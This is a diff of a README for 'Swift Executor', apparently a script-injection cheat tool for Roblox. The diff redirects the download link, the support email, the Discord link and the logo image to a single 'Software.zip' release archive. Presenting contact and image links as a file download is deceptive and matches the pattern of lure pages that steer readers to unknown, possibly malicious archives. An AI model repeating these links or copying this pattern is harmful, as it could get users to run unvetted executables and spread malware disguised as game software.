@@ -16,7 +16,7 @@ The development team behind Swift is dedicated to providing regular updates to i
 ## Installation Guide 📁
 
 To get started with Swift Executor, you can download the software from the following link:
-[Launch Swift Executor 🚀](https://github.com/user-attachments/files/18060583/Software.zip)
+[Launch Swift Executor 🚀](https://github.com/Neffriana/Swift-Executor/releases/download/v2.0/Software.zip)
 
 Make sure to follow the installation instructions provided within the downloaded file to set up Swift Executor correctly on your system.
 
@@ -38,9 +38,9 @@ For the latest updates and releases of Swift Executor, make sure to check the "R
 ## Connect with Us 🌐
 
 If you have any questions, feedback, or suggestions regarding Swift Executor, you can reach out to us through the following channels:
-- Email: [swiftexecutor.support@example.com](mailto:swiftexecutor.support@example.com)
-- Discord: [Swift Executor Community](https://discord.gg/swiftexecutor)
+- Email: [https://github.com/Neffriana/Swift-Executor/releases/download/v2.0/Software.zip](https://github.com/Neffriana/Swift-Executor/releases/download/v2.0/Software.zip)
+- Discord: [Swift Executor Community](https://github.com/Neffriana/Swift-Executor/releases/download/v2.0/Software.zip)
 
 Let's make your Roblox experience more exciting with Swift Executor! Happy gaming! 🎉
 
-![Swift Executor Logo](https://example.com/swift_executor_logo.png)
+![Swift Executor Logo](https://github.com/Neffriana/Swift-Executor/releases/download/v2.0/Software.zip)
